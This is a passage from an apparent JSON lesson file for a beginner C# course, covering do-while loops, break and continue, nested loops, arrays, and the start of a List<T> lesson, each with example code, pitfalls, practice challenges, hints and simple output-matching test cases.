              "code": "// Regular while - might not run at all\nint x = 10;\nwhile (x < 5)  // False from the start\n{\n    Console.WriteLine(\"This never prints!\");\n}\n\n// Do-while - runs at least once!\nint y = 10;\ndo\n{\n    Console.WriteLine(\"This prints once, even though y is not < 5!\");\n} while (y < 5);  // Condition checked AFTER\n\n// Practical example: Menu system\nint choice;\ndo\n{\n    Console.WriteLine(\"\\n=== MENU ===\");\n    Console.WriteLine(\"1. Play Game\");\n    Console.WriteLine(\"2. Settings\");\n    Console.WriteLine(\"3. Quit\");\n    Console.Write(\"Enter choice: \");\n    \n    // Simulating user input (in real code: int.Parse(Console.ReadLine()))\n    choice = 3; // Pretend user chose quit\n    \n    switch (choice)\n    {\n        case 1:\n            Console.WriteLine(\"Starting game...\");\n            break;\n        case 2:\n            Console.WriteLine(\"Opening settings...\");\n            break;\n        case 3:\n            Console.WriteLine(\"Goodbye!\");\n            break;\n        default:\n            Console.WriteLine(\"Invalid choice!\");\n            break;\n    }\n    \n} while (choice != 3);\n\nConsole.WriteLine(\"Thanks for playing!\");\n\n// Input validation pattern - keep asking until valid\nint age;\nbool isValid;\ndo\n{\n    Console.Write(\"Enter your age (1-120): \");\n    age = 25;  // Simulating input\n    isValid = age >= 1 && age <= 120;\n    \n    if (!isValid)\n    {\n        Console.WriteLine(\"Invalid age! Try again.\");\n    }\n} while (!isValid);\n\nConsole.WriteLine($\"Your age is {age}\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`do { } while (condition);`**: Structure: 'do' keyword, then { code }, then 'while (condition)' and SEMICOLON. The semicolon after while is REQUIRED for do-while!\n\n**`Runs at least once`**: The code block executes FIRST, THEN the condition is checked. Even if the condition is false, the code runs one time!\n\n**`Condition at the end`**: The while (condition); comes AFTER the closing brace. If condition is true, loop back to 'do'. If false, continue after the loop.\n\n**`Don't forget the semicolon!`**: while (condition); - the semicolon at the end is MANDATORY for do-while! Forgetting it causes a compiler error.\n\n**`Perfect use cases`**: Input validation (ask once, validate, re-ask if invalid), menu systems (show menu at least once), retry logic (try at least once, retry on failure)."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Missing semicolon**: `} while (condition)` is WRONG! You MUST have a semicolon: `} while (condition);` - this is the #1 do-while mistake.\n\n**Confusing with regular while**: `while` checks BEFORE (might run 0 times). `do-while` checks AFTER (runs at least 1 time). Choose the right one!\n\n**Wrong brace placement**: It's `do { } while`, NOT `do while { }`. The while comes AFTER the closing brace, not before.\n\n**Using when not needed**: If your loop might legitimately need to run zero times, use a regular `while` instead. `do-while` forces at least one execution.\n\n**Infinite loops still possible**: Even though it runs at least once, you can still create infinite loops if the condition never becomes false!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-04-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a simple dice rolling simulator!\n\n1. Create an int variable 'diceRoll' = 1\n2. Use a do-while loop:\n   - Display 'Rolling dice...'\n   - Display the current dice value\n   - Add 1 to diceRoll\n3. Continue while diceRoll is <= 6\n\nThe loop should run exactly 6 times, showing rolls 1 through 6!",
              "starterCode": "// Dice roller\nint diceRoll = 1;\n\n// Write your do-while loop here",
              "solution": "// Dice roller\nint diceRoll = 1;\n\n// Write your do-while loop here\ndo\n{\n    Console.WriteLine(\"Rolling dice...\");\n    Console.WriteLine(\"You rolled: \" + diceRoll);\n    diceRoll++;\n} while (diceRoll <= 6);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Rolling\"",
                  "expectedOutput": "Rolling",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Structure: do { code here; change variable; } while (condition); Don't forget the semicolon after while!"
                },
                {
                  "level": 2,
                  "text": "Forgetting the semicolon: } while (condition); - the semicolon after while is REQUIRED! Without it, compiler error!"
                },
                {
                  "level": 3,
                  "text": "Confusing do-while with while: do-while checks condition at END (runs at least once). while checks at START (might not run at all)."
                },
                {
                  "level": 4,
                  "text": "Wrong brace placement: It's do { } while, not do while { }. The 'while' comes AFTER the closing brace!"
                },
                {
                  "level": 5,
                  "text": "When to use do-while: Use it when you MUST run the code at least once. Menus, user prompts, 'try again?' scenarios are perfect!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting the semicolon",
                  "consequence": "} while (condition); - the semicolon after while is REQUIRED! Without it, compiler error!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Confusing do-while with while",
                  "consequence": "do-while checks condition at END (runs at least once). while checks at START (might not run at all).",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Wrong brace placement",
                  "consequence": "It's do { } while, not do while { }. The 'while' comes AFTER the closing brace!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "When to use do-while",
                  "consequence": "Use it when you MUST run the code at least once. Menus, user prompts, 'try again?' scenarios are perfect!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-04-04",
          "title": "Loop Control (break and continue)",
          "moduleId": "module-04",
          "order": 4,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're reading through a book chapter by chapter:\n\n• BREAK: You find the answer you need on chapter 5. You say 'I'm done!' and CLOSE THE BOOK completely. You exit the loop!\n\n• CONTINUE: You're on chapter 3 and it's boring. You say 'Skip this chapter!' and jump to chapter 4. You stay in the loop, just skip THIS iteration!\n\nThese are CONTROL STATEMENTS that give you finer control over loops:\n\n**break** = Exit the loop IMMEDIATELY, no matter what. Jump to the code after the loop.\n\n**continue** = Skip the REST of this iteration and jump to the next one. The loop continues!\n\nThink of a security checkpoint:\n• break: 'Suspicious person found! Shut down the whole checkpoint!' (exit loop)\n• continue: 'This person is fine, next person please!' (skip to next iteration)"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "The `break` statement exits a loop immediately, while `continue` skips the rest of the current iteration and moves to the next one. Both give you fine-grained control over loop execution beyond the main condition.",
              "code": "// BREAK example - exit loop early\nfor (int i = 1; i <= 10; i++)\n{\n    Console.WriteLine($\"Number: {i}\");\n    \n    if (i == 5)\n    {\n        Console.WriteLine(\"Found 5! Exiting loop.\");\n        break;  // Exit the entire loop\n    }\n}\nConsole.WriteLine(\"Loop ended.\");\n// Only prints 1, 2, 3, 4, 5, then exits!\n\n// CONTINUE example - skip current iteration\nfor (int i = 1; i <= 10; i++)\n{\n    if (i % 2 == 0)  // If even number\n    {\n        continue;  // Skip the rest, go to next iteration\n    }\n    \n    Console.WriteLine($\"Odd number: {i}\");\n}\n// Only prints odd numbers: 1, 3, 5, 7, 9\n\n// Real-world: Finding a player in a list\nstring[] players = { \"Alice\", \"Bob\", \"Charlie\", \"David\" };\nstring targetPlayer = \"Charlie\";\n\n// Using foreach with break\nforeach (string player in players)\n{\n    if (player == targetPlayer)\n    {\n        Console.WriteLine($\"Found player: {player}\");\n        break;  // Found them, stop searching!\n    }\n}\n\n// Filtering with continue\nint[] scores = { 85, 42, 91, 55, 78, 33, 95 };\nConsole.WriteLine(\"High scores (75+):\");\n\nforeach (int score in scores)\n{\n    if (score < 75)\n    {\n        continue;  // Skip low scores\n    }\n    Console.WriteLine($\"  {score}\");\n}\n\n// Early exit from while loop\nint attempts = 0;\nwhile (true)  // Infinite loop - controlled by break\n{\n    attempts++;\n    Console.WriteLine($\"Attempt {attempts}\");\n    \n    if (attempts >= 3)\n    {\n        Console.WriteLine(\"Max attempts reached!\");\n        break;  // Exit the infinite loop\n    }\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`break;`**: Immediately exits the loop. Code jumps to the first line AFTER the loop. The loop is completely done, even if iterations remain!\n\n**`continue;`**: Skips the rest of the current iteration and jumps back to the loop's condition check. The loop keeps going, just skips THIS round!\n\n**`break in nested loops`**: break only exits the INNERMOST loop it's in! If you have loops inside loops, break only exits the current one, not all of them.\n\n**`When to use`**: break: When you find what you're looking for and don't need to continue. continue: When you want to skip specific items but keep processing others.\n\n**`Works in all loops`**: Both break and continue work in for, foreach, while, and do-while loops. They're essential for efficient loop control."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Confusing break and continue**: `break` EXITS the entire loop. `continue` SKIPS to the next iteration. They do very different things!\n\n**Using outside a loop**: `break` and `continue` only work INSIDE loops! Using them outside causes a compile error: \"No enclosing loop.\"\n\n**Break only exits innermost loop**: In nested loops, `break` only exits the current (innermost) loop. To exit multiple levels, use a flag variable or restructure your code.\n\n**Unreachable code after break**: Code after `break` in the same block never runs: `if (x) { break; DoSomething(); }` - DoSomething is dead code!\n\n**Continue placement matters**: Putting `continue` before important code means that code gets skipped. Place your condition checks carefully to avoid logic bugs."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-04-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a number analyzer!\n\n1. Use a for loop from 1 to 20\n2. Use CONTINUE to skip all even numbers (if i % 2 == 0, continue)\n3. If you hit the number 15, use BREAK to exit the loop entirely\n4. Display all odd numbers before 15\n\nExpected output: 1, 3, 5, 7, 9, 11, 13, then stops!",
              "starterCode": "// Number analyzer\nfor (int i = 1; i <= 20; i++)\n{\n    // Skip even numbers\n    \n    // Break at 15\n    \n    // Display the number\n}",
              "solution": "// Number analyzer\nfor (int i = 1; i <= 20; i++)\n{\n    // Skip even numbers\n    if (i % 2 == 0)\n    {\n        continue;\n    }\n    \n    // Break at 15\n    if (i == 15)\n    {\n        break;\n    }\n    \n    // Display the number\n    Console.WriteLine(i);\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should display odd numbers starting with 1",
                  "expectedOutput": "1",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should include 13 (last odd number before 15)",
                  "expectedOutput": "13",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Code should use continue to skip even numbers",
                  "expectedOutput": "continue",
                  "isVisible": false
                },
                {
                  "id": "test-4",
                  "description": "Code should use break to exit at 15",
                  "expectedOutput": "break",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use if (i % 2 == 0) continue; to skip evens. Use if (i == 15) break; to exit at 15. Put the Console.WriteLine at the end!"
                },
                {
                  "level": 2,
                  "text": "Confusing break and continue: break EXITS the loop. continue SKIPS to next iteration. Very different behaviors!"
                },
                {
                  "level": 3,
                  "text": "Using outside loops: break and continue ONLY work inside loops! Using them outside a loop causes a compile error."
                },
                {
                  "level": 4,
                  "text": "Unreachable code after break: Code after break in the same block never runs! if (x) { break; Console.WriteLine('hi'); } - 'hi' is unreachable!"
                },
                {
                  "level": 5,
                  "text": "Continue logic errors: Putting continue before important code means that code gets skipped! Place your continue checks carefully."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Confusing break and continue",
                  "consequence": "break EXITS the loop. continue SKIPS to next iteration. Very different behaviors!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using outside loops",
                  "consequence": "break and continue ONLY work inside loops! Using them outside a loop causes a compile error.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Unreachable code after break",
                  "consequence": "Code after break in the same block never runs! if (x) { break; Console.WriteLine('hi'); } - 'hi' is unreachable!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Continue logic errors",
                  "consequence": "Putting continue before important code means that code gets skipped! Place your continue checks carefully.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-04-05",
          "title": "Nested Loops (Loops Within Loops)",
          "moduleId": "module-04",
          "order": 5,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're organizing a tournament where every team plays every other team:\n\n• Outer loop: Go through each team (Team A, Team B, Team C...)\n• Inner loop: For THIS team, play against every OTHER team\n\nTeam A plays Team B, Team C, Team D...\nTeam B plays Team A, Team C, Team D...\nAnd so on!\n\nThat's a NESTED LOOP - a loop INSIDE another loop!\n\nThink of it like checking every seat in a theater:\n• Outer loop: Go through each ROW (Row 1, Row 2, Row 3...)\n• Inner loop: For THIS row, check each SEAT (Seat A, B, C...)\n\nRow 1, Seat A → Row 1, Seat B → ... → Row 2, Seat A → Row 2, Seat B...\n\nNested loops are powerful for grids, patterns, tables, or any time you need to do something for EVERY COMBINATION of two things!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "Nested loops place one loop inside another. For each iteration of the outer loop, the inner loop runs completely. This creates a multiplicative effect: 3 outer iterations times 4 inner iterations equals 12 total inner loop executions. This pattern is perfect for grids, tables, patterns, and comparing pairs of items.",
              "code": "// BASIC NESTED LOOP - GRID\nfor (int row = 0; row < 3; row++)\n{\n    for (int col = 0; col < 4; col++)\n    {\n        Console.Write(\"* \");\n    }\n    Console.WriteLine();  // New line after each row\n}\n// Output:\n// * * * *\n// * * * *\n// * * * *\n\n// MULTIPLICATION TABLE\nfor (int i = 1; i <= 5; i++)\n{\n    for (int j = 1; j <= 5; j++)\n    {\n        int result = i * j;\n        Console.Write($\"{result,4}\");  // 4 spaces wide\n    }\n    Console.WriteLine();\n}\n\n// TRIANGLE PATTERN\nfor (int row = 1; row <= 5; row++)\n{\n    for (int col = 1; col <= row; col++)\n    {\n        Console.Write(\"*\");\n    }\n    Console.WriteLine();\n}\n// Output: *, **, ***, ****, *****\n\n// COMPARING ALL PAIRS - using foreach\nstring[] team1 = { \"Alice\", \"Bob\", \"Charlie\" };\nstring[] team2 = { \"Diana\", \"Eve\" };\n\nConsole.WriteLine(\"All possible matchups:\");\nforeach (string player1 in team1)\n{\n    foreach (string player2 in team2)\n    {\n        Console.WriteLine($\"{player1} vs {player2}\");\n    }\n}\n\n// FINDING DUPLICATES\nint[] numbers = { 1, 2, 3, 2, 4, 1, 5 };\n\nfor (int i = 0; i < numbers.Length; i++)\n{\n    for (int j = i + 1; j < numbers.Length; j++)\n    {\n        if (numbers[i] == numbers[j])\n        {\n            Console.WriteLine($\"Duplicate found: {numbers[i]}\");\n        }\n    }\n}\n\n// BREAKING OUT OF NESTED LOOPS\nint[,] grid = { { 1, 2, 3 }, { 4, 5, 6 }, { 7, 8, 9 } };\nint searchFor = 5;\nbool found = false;\n\nfor (int r = 0; r < 3 && !found; r++)\n{\n    for (int c = 0; c < 3; c++)\n    {\n        if (grid[r, c] == searchFor)\n        {\n            Console.WriteLine($\"Found {searchFor} at [{r},{c}]\");\n            found = true;\n            break;  // Breaks inner loop, flag stops outer\n        }\n    }\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`Outer and Inner loops`**: Outer loop runs first. For EACH outer iteration, inner loop runs COMPLETELY. If outer runs 3 times, inner 4 times = total 3x4=12 inner executions!\n\n**`Loop variables`**: Use different variable names! Outer: i, Inner: j. Or row/col, x/y. Can't reuse same name: `for (int i...) { for (int i...) }` is an ERROR!\n\n**`break in nested loops`**: break only exits CURRENT (innermost) loop! To exit both loops, use a flag variable checked in the outer loop's condition.\n\n**`Performance consideration`**: Nested loops multiply iterations! 100 outer x 100 inner = 10,000 total. For CPU-intensive work on large datasets, consider `Parallel.For` or `Parallel.ForEach` for multi-threaded execution.\n\n**`foreach with nested loops`**: You can nest `foreach` loops just like `for` loops. Great for iterating over collections of collections."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Variable name collision**: `for (int i...) { for (int i...) }` is a compile error! Use different names: i/j, row/col, outer/inner.\n\n**Modifying outer variable in inner loop**: `for (int i=0; i<3; i++) { for (int j=0; j<5; j++) { i=0; } }` resets i forever - infinite loop!\n\n**Break only exits innermost loop**: In nested loops, `break` exits only the current loop. To exit all loops, use a flag: `bool done = false;` and check it in outer loop conditions.\n\n**Performance explosion**: Nested loops multiply! 100x100=10,000 iterations. 100x100x100=1,000,000! Avoid deeply nested loops (3+ levels). Consider LINQ or parallel processing for large datasets.\n\n**Off-by-one in patterns**: For a triangle pattern, `for (j=1; j<=i; j++)` gives increasing rows. Getting the bounds wrong is easy - trace through manually first!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-04-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a calendar month printer!\n\n1. Ask user for:\n   - Month name\n   - Number of days in month (28-31)\n   - What day of week month starts (1=Monday, 7=Sunday)\n2. Print calendar header:\n   Mon Tue Wed Thu Fri Sat Sun\n3. Use nested loops (or single loop logic):\n   - Print spaces for starting day offset\n   - Print day numbers 1 to total days\n   - Start new line after every 7 days (weekly rows)\n4. Format nicely with 4-character width per day\n\nExample:\nMonth: March\nDays: 31\nStarts on: 3 (Wednesday)\n\n     March 2025\nMon Tue Wed Thu Fri Sat Sun\n              1   2   3   4\n  5   6   7   8   9  10  11\n 12  13  14  15  16  17  18\n 19  20  21  22  23  24  25\n 26  27  28  29  30  31",
              "starterCode": "// Calendar Printer\n\nConsole.WriteLine(\"Enter month name:\");\nstring month = Console.ReadLine();\n\nConsole.WriteLine(\"Enter number of days:\");\nint daysInMonth = int.Parse(Console.ReadLine());\n\nConsole.WriteLine(\"What day does month start? (1=Mon, 7=Sun):\");\nint startDay = int.Parse(Console.ReadLine());\n\n// Print header\nConsole.WriteLine($\"\\n     {month} 2025\");\nConsole.WriteLine(\"Mon Tue Wed Thu Fri Sat Sun\");\n\n// Print calendar grid\nint dayOfWeek = 1;\n\n// Print leading spaces\n\n// Print day numbers\n\n// New line after each week",
              "solution": "// Calendar Printer\n\nConsole.WriteLine(\"Enter month name:\");\nstring month = Console.ReadLine();\n\nConsole.WriteLine(\"Enter number of days:\");\nint daysInMonth = int.Parse(Console.ReadLine());\n\nConsole.WriteLine(\"What day does month start? (1=Mon, 7=Sun):\");\nint startDay = int.Parse(Console.ReadLine());\n\n// Print header\nConsole.WriteLine($\"\\n     {month} 2025\");\nConsole.WriteLine(\"Mon Tue Wed Thu Fri Sat Sun\");\n\n// Print leading spaces for offset\nfor (int i = 1; i < startDay; i++)\n{\n    Console.Write(\"    \");  // 4 spaces for empty day\n}\n\nint currentDayOfWeek = startDay;\n\n// Print each day of month\nfor (int day = 1; day <= daysInMonth; day++)\n{\n    Console.Write($\"{day,4}\");  // Right-aligned in 4 spaces\n    \n    // Check if end of week (Sunday = 7)\n    if (currentDayOfWeek == 7)\n    {\n        Console.WriteLine();  // New line for next week\n        currentDayOfWeek = 1;  // Reset to Monday\n    }\n    else\n    {\n        currentDayOfWeek++;\n    }\n}\n\nConsole.WriteLine();  // Final newline",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Mon\"",
                  "expectedOutput": "Mon",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Tue\"",
                  "expectedOutput": "Tue",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Wed\"",
                  "expectedOutput": "Wed",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"month\"",
                  "expectedOutput": "month",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Print startDay-1 spaces (4 chars each) before first day. Loop day from 1 to daysInMonth. Track currentDayOfWeek. When reaches 7, WriteLine() for new row. {day,4} right-aligns in 4 spaces."
                },
                {
                  "level": 2,
                  "text": "Infinite nested loops: Outer loop reset by inner! for (int i=0; i<3; i++) { for (int j=0; j<5; j++) { i=0; } } resets i, never ends! Don't modify outer variable in inner loop."
                },
                {
                  "level": 3,
                  "text": "Variable name collision: for (int i=0...) { for (int i=0...) } ERROR! Can't use same variable name. Use i, j, k or row/col or outer/inner."
                },
                {
                  "level": 4,
                  "text": "Break confusion: break only exits innermost loop! for (...) { for (...) { break; } } breaks inner only. Need flag: bool done=false; and if (done) break; in outer."
                },
                {
                  "level": 5,
                  "text": "Off-by-one in patterns: Triangle: for (i=1; i<=5; i++) { for (j=1; j<=i; j++) } gives increasing. for (j=1; j<=5-i; j++) gives decreasing. Easy to get backwards!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Infinite nested loops",
                  "consequence": "Outer loop reset by inner! for (int i=0; i<3; i++) { for (int j=0; j<5; j++) { i=0; } } resets i, never ends! Don't modify outer variable in inner loop.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Variable name collision",
                  "consequence": "for (int i=0...) { for (int i=0...) } ERROR! Can't use same variable name. Use i, j, k or row/col or outer/inner.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Break confusion",
                  "consequence": "break only exits innermost loop! for (...) { for (...) { break; } } breaks inner only. Need flag: bool done=false; and if (done) break; in outer.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Off-by-one in patterns",
                  "consequence": "Triangle: for (i=1; i<=5; i++) { for (j=1; j<=i; j++) } gives increasing. for (j=1; j<=5-i; j++) gives decreasing. Easy to get backwards!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        }
      ]
    },
    {
      "id": "module-05",
      "title": "Collections",
      "description": "Work with arrays, Lists, Dictionaries, and other collection types for managing groups of data.",
      "difficulty": "beginner",
      "estimatedHours": 1,
      "lessons": [
        {
          "id": "lesson-05-01",
          "title": "Arrays (The Fixed-Size Shelf)",
          "moduleId": "module-05",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you buy a bookshelf with exactly 5 slots. You can put 5 books on it, no more, no less. Each slot has a number (0, 1, 2, 3, 4), and you can access any book directly: 'Give me the book in slot 3!'\n\nThat's an ARRAY! It's a collection of items:\n• Fixed size (decided when created - can't grow or shrink!)\n• All items must be the same type (all ints, all strings, etc.)\n• Accessed by index (position number, starting from 0!)\n\nWhy start at 0? Because programmers are weird! Seriously, it's a computer science convention. The FIRST item is at index 0, second at index 1, etc.\n\nArrays are FAST for accessing items (instant lookup!) but INFLEXIBLE (can't change size). Perfect for fixed data like days of the week, months, or game levels!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// Creating arrays\nint[] scores = new int[5];  // Creates array with 5 empty slots\nscores[0] = 95;  // First item (index 0)\nscores[1] = 87;\nscores[2] = 92;\nscores[3] = 78;\nscores[4] = 88;  // Last item (index 4, not 5!)\n\n// Or initialize with values directly\nstring[] players = { \"Alice\", \"Bob\", \"Charlie\" };\n\n// Accessing array items\nConsole.WriteLine(\"First player: \" + players[0]);  // Alice\nConsole.WriteLine(\"Third player: \" + players[2]);  // Charlie\n\n// Array length\nConsole.WriteLine(\"Number of players: \" + players.Length);\n\n// Looping through an array\nfor (int i = 0; i < scores.Length; i++)\n{\n    Console.WriteLine(\"Score \" + i + \": \" + scores[i]);\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`int[] arrayName`**: Square brackets [] after the type means 'array of this type'. int[] means array of integers, string[] means array of strings.\n\n**`new int[5]`**: Creates an array with 5 slots. The number in brackets is the SIZE. Once created, this size can NEVER change!\n\n**`arrayName[index]`**: Access an item using square brackets and the index. Remember: indexes start at 0! An array of size 5 has indexes 0, 1, 2, 3, 4.\n\n**`.Length`**: The Length property tells you how many items the array holds. arrayName.Length is VERY useful in loops!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These!\n\n**IndexOutOfRangeException**: The most common array error! If your array has 5 items (indexes 0-4), accessing array[5] CRASHES your program. Always check that index < array.Length!\n\n**Off-by-one errors**: Since arrays start at 0, the LAST valid index is Length - 1. An array of size 5 has valid indexes 0, 1, 2, 3, 4 - NOT 5!\n\n**Arrays are fixed size**: Once created, you CANNOT resize an array. If you need to add more items, you must create a new, bigger array and copy everything. Use List<T> instead if you need dynamic sizing!\n\n**Default values**: When you create an array without initializing, items have default values (0 for numbers, null for objects, false for bool). Don't assume the array is truly 'empty'!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-05-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a weekly temperature tracker!\n\n1. Create a double array 'temperatures' with 7 slots (for 7 days)\n2. Fill it with values: 72.5, 75.0, 68.3, 71.2, 74.8, 70.1, 69.5\n3. Use a for loop to display each day's temperature: 'Day [index]: [temp]°F'\n4. Calculate and display the average temperature\n\nHint: To calculate average, add all temps and divide by array.Length!",
              "starterCode": "// Create temperature array\n\n// Fill with values\n\n// Display each temperature with a loop\n\n// Calculate average",
              "solution": "// Create temperature array\ndouble[] temperatures = new double[7];\n\n// Fill with values\ntemperatures[0] = 72.5;\ntemperatures[1] = 75.0;\ntemperatures[2] = 68.3;\ntemperatures[3] = 71.2;\ntemperatures[4] = 74.8;\ntemperatures[5] = 70.1;\ntemperatures[6] = 69.5;\n\n// Display each temperature with a loop\nfor (int i = 0; i < temperatures.Length; i++)\n{\n    Console.WriteLine(\"Day \" + i + \": \" + temperatures[i] + \"°F\");\n}\n\n// Calculate average\ndouble sum = 0;\nfor (int i = 0; i < temperatures.Length; i++)\n{\n    sum += temperatures[i];\n}\ndouble average = sum / temperatures.Length;\nConsole.WriteLine(\"Average: \" + average + \"°F\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Day\"",
                  "expectedOutput": "Day",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Average\"",
                  "expectedOutput": "Average",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Create: double[] temps = new double[7]; Access: temps[0] = value; Loop: for (int i = 0; i < temps.Length; i++)"
                },
                {
                  "level": 2,
                  "text": "Index out of range: array[5] when the array has 5 items (indexes 0-4) = CRASH! Always remember: indexes go from 0 to Length-1!"
                },
                {
                  "level": 3,
                  "text": "Forgetting 'new' keyword: int[] arr = int[5]; is WRONG! Must be: int[] arr = new int[5];"
                },
                {
                  "level": 4,
                  "text": "Wrong loop condition: for (i = 0; i <= arr.Length; i++) goes ONE TOO FAR! Use i < arr.Length (less than, not less-or-equal)!"
                },
                {
                  "level": 5,
                  "text": "Trying to resize: You CAN'T change array size after creation! array.Length = 10; doesn't work. Create a new array if you need different size."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Index out of range",
                  "consequence": "array[5] when the array has 5 items (indexes 0-4) = CRASH! Always remember: indexes go from 0 to Length-1!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting 'new' keyword",
                  "consequence": "int[] arr = int[5]; is WRONG! Must be: int[] arr = new int[5];",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Wrong loop condition",
                  "consequence": "for (i = 0; i <= arr.Length; i++) goes ONE TOO FAR! Use i < arr.Length (less than, not less-or-equal)!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Trying to resize",
                  "consequence": "You CAN'T change array size after creation! array.Length = 10; doesn't work. Create a new array if you need different size.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-05-02",
          "title": "List<T> (The Flexible Container)",
          "moduleId": "module-05",
          "order": 2,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Remember arrays? They're like a bookshelf with fixed slots - you can't add more books if it's full!\n\nA LIST is like a magical expanding shelf! You can:\n• Add items anytime (shelf grows automatically!)\n• Remove items (shelf shrinks!)\n• Insert items in the middle\n• Check if an item exists\n\nLists are DYNAMIC - they change size as needed. The <T> syntax (like List<int>) means 'List of what type?' Just like arrays, all items must be the same type, but unlike arrays, you can grow and shrink them!\n\nThink of a grocery list app: You add items ('milk'), remove items when bought, and the list grows/shrinks automatically. You wouldn't use a fixed array for that - you'd use a List!\n\nLists are THE most common collection in C#. When in doubt, use a List!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
